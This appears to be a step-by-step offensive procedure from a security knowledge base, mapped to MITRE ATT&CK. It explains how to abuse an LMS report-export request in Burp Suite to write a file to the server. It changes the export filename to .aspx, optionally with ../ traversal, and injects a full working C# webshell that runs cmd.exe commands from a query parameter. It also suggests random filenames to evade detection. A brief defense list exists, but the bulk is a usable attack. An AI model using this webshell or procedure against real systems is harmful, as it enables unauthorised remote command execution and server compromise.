---
tags:
  - webshell
  - parameter-injection
  - path-traversal
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Web Shell]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:24:08.177Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Web Shell]]'
id: a45cbf67-794d-4e2f-8b96-b2e737f28018
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Web Shell]]'
  - '[[File and Directory Discovery]]'
---
# Modify-Parameters-for-ASpx-Webshell-Upload

## Summary

This procedure modifies the intercepted report export request in Burp Suite to set a malicious .aspx filename and inject C# webshell code via rdReportName, resulting in server-side file write and RCE capability.

## Description

The LMS export lacks validation on rdExportFilename (allows .aspx extensions and ../ traversal) and rdReportName (accepts unsanitized content). By altering these, an ASPX file with embedded C# code is written to the server, creating a webshell that executes commands from query parameters using System.Diagnostics.Process.

## Requirements

1. Intercepted POST request in Burp Repeater from prior procedure
2. Knowledge of URL-encoding for C# code injection
3. Target path understanding (e.g., /RServer/rdDownload/ for uploads)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all filename extensions and paths in export handlers
- Restrict file writes to isolated directories with no-execute permissions
- Scan uploaded files for executable code signatures using antivirus/WAF

## Objectives

1. Change filename to .aspx for executability
2. Inject functional C# webshell code
3. Forward request to trigger upload and verify access

## Instructions

### Step 1: Alter rdExportFilename

**Context**: Set the filename to end in .aspx, optionally with traversal for broader impact.

In Burp Repeater, edit the POST body: change rdExportFilename=report.xls to rdExportFilename=68c2c8b1fc47766eaf43027a8eaca121.aspx (use a hashed or random name to evade detection).

> For path traversal DoS, use ../ to target other .aspx files.

### Step 2: Inject Webshell Code into rdReportName

**Context**: Embed C# code that spawns CMD processes from query params.

Set rdReportName to URL-encoded version of: <%@ Page Language="C#" %><% string cmd=Request.QueryString["68c2c8b1fc47766eaf43027a8eaca121"];if(cmd!=null){System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c "+cmd); startInfo.UseShellExecute = false; startInfo.RedirectStandardOutput = true; System.Diagnostics.Process process = System.Diagnostics.Process.Start(startInfo); string output = process.StandardOutput.ReadToEnd(); Response.Write(output); process.WaitForExit();} %>

> Encode special chars (e.g., %20 for spaces) to fit in POST body.

### Step 3: Forward and Access Webshell

**Context**: Send the modified request and locate the uploaded file.

Click 'Forward' or 'Go' in Repeater. Follow the 302 redirect to /RServer/rdDownload/.../68c2c8b1fc47766eaf43027a8eaca121.aspx.

> If successful, the page loads without error, ready for command injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Web Shell]] Web Shell
- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques

- [[Web Shell]] Web Shell

## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- webshell
- parameter-injection
- path-traversal
